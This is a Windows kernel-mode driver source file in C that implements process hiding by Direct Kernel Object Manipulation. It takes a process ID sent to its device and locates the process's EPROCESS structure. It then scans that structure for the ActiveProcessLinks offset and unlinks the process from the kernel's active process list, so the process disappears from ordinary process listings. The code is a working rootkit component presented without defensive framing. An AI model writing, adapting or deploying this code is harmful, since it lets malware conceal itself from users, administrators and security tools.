#include "header_help.h"
 
UNICODE_STRING DeviceName=RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver"),SymbolicLink=RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
PDEVICE_OBJECT pDeviceObject;
 
void Unload(PDRIVER_OBJECT pDriverObject)
{
    IoDeleteSymbolicLink(&SymbolicLink);
    IoDeleteDevice(pDriverObject->DeviceObject);
}
 
NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject,PIRP irp)
{
    PIO_STACK_LOCATION io;
    PVOID buffer;
    PEPROCESS Process;
 
    PULONG ptr;
    PLIST_ENTRY PrevListEntry,CurrListEntry,NextListEntry;
 
    NTSTATUS status;
    ULONG i,offset;
 
    io=IoGetCurrentIrpStackLocation(irp);
    irp->IoStatus.Information=0;
    offset=0;
 
    switch(io->MajorFunction)
    {
        case IRP_MJ_CREATE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_CLOSE:
            status=STATUS_SUCCESS;
            break;
        case IRP_MJ_READ:
            status=STATUS_SUCCESS;
        case IRP_MJ_WRITE:
 
            buffer=MmGetSystemAddressForMdlSafe(irp->MdlAddress,NormalPagePriority);
 
            if(!buffer)
            {
                status=STATUS_INSUFFICIENT_RESOURCES;
                break;
            }
 
            DbgPrint("Process ID: %d",*(PHANDLE)buffer);
 
            if(!NT_SUCCESS(status=PsLookupProcessByProcessId(*(PHANDLE)buffer,&Process)))
            {
                DbgPrint("Error: Unable to open process object (%#x)",status);
                break;
            }
 
            DbgPrint("EPROCESS address: %#x",Process);
            ptr=(PULONG)Process;
 
            // Scan the EPROCESS structure for the PID
 
            for(i=0;i<512;i++)
            {
                if(ptr[i]==*(PULONG)buffer)
                {
                    offset=(ULONG)&ptr[i+1]-(ULONG)Process; // ActiveProcessLinks is located next to the PID
 
                    DbgPrint("ActiveProcessLinks offset: %#x",offset);
                    break;
                }
            }
 
            if(!offset)
            {
                status=STATUS_UNSUCCESSFUL;
                break;
            }
 
            CurrListEntry=(PLIST_ENTRY)((PUCHAR)Process+offset); // Get the ActiveProcessLinks address
 
            PrevListEntry=CurrListEntry->Blink;
            NextListEntry=CurrListEntry->Flink;
 
            // Unlink the target process from other processes
 
            PrevListEntry->Flink=CurrListEntry->Flink;
            NextListEntry->Blink=CurrListEntry->Blink;
 
            // Point Flink and Blink to self
 
            CurrListEntry->Flink=CurrListEntry;
            CurrListEntry->Blink=CurrListEntry;
 
            ObDereferenceObject(Process); // Dereference the target process
 
            status=STATUS_SUCCESS;
            irp->IoStatus.Information=sizeof(HANDLE);
 
            break;
 
        default:
            status=STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
 
    irp->IoStatus.Status=status;
 
    IoCompleteRequest(irp,IO_NO_INCREMENT);
    return status;
}
 
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
    ULONG i;
     
    IoCreateDevice(pDriverObject,0,&DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&pDeviceObject);
    IoCreateSymbolicLink(&SymbolicLink,&DeviceName);
 
    pDriverObject->DriverUnload=Unload;
 
    for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
    {
        pDriverObject->MajorFunction[i]=DriverDispatch;
    }
 
    pDeviceObject->Flags&=~DO_DEVICE_INITIALIZING;
    pDeviceObject->Flags|=DO_DIRECT_IO;
 
    return STATUS_SUCCESS;
}